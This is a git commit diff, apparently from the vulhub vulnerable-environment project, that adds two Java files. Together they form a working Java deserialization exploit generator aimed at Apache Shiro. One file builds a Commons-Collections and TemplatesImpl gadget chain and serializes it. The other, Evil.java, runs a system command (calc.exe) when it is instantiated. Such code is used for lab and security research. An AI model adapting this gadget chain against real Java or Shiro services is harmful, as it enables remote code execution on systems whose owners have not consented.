4366874f217ec8b65e872e3d934347fc80e35f50
phith0n <phith0n.ph2f@gmail.com>
2021-03-09 02:11:30 +0800

    add shiro deserialization

---
+++ shiro/src/main/java/org/vulhub/shiroattack/CommonsCollectionsShiro.java
@@ -0,0 +1,60 @@
+package org.vulhub.shiroattack;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollectionsShiro {
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public byte[] getPayload(byte[] clazzBytes) throws Exception {
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
+        setFieldValue(obj, "_name", "HelloTemplatesImpl");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+
+        Transformer transformer = new InvokerTransformer("getClass", null, null);
+
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformer);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
+
+        Map expMap = new HashMap();
+        expMap.put(tme, "valuevalue");
+
+        outerMap.clear();
+        setFieldValue(transformer, "iMethodName", "newTransformer");
+
+        // ==================
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(expMap);
+        oos.close();
+
+        return barr.toByteArray();
+    }
+
+    public static void main(String []args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evil.class.getName());
+
+        System.out.println("Class " + Evil.class.getName() + "'s bytecode is generate.");
+        new CommonsCollectionsShiro().getPayload(clazz.toBytecode());
+    }
+}
---
+++ shiro/src/main/java/org/vulhub/shiroattack/Evil.java
@@ -0,0 +1,19 @@
+package org.vulhub.shiroattack;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Evil extends AbstractTranslet {
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
+
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
+
+    public Evil() throws Exception {
+        super();
+        System.out.println("Hello TemplatesImpl");
+        Runtime.getRuntime().exec("calc.exe");
+    }
+}
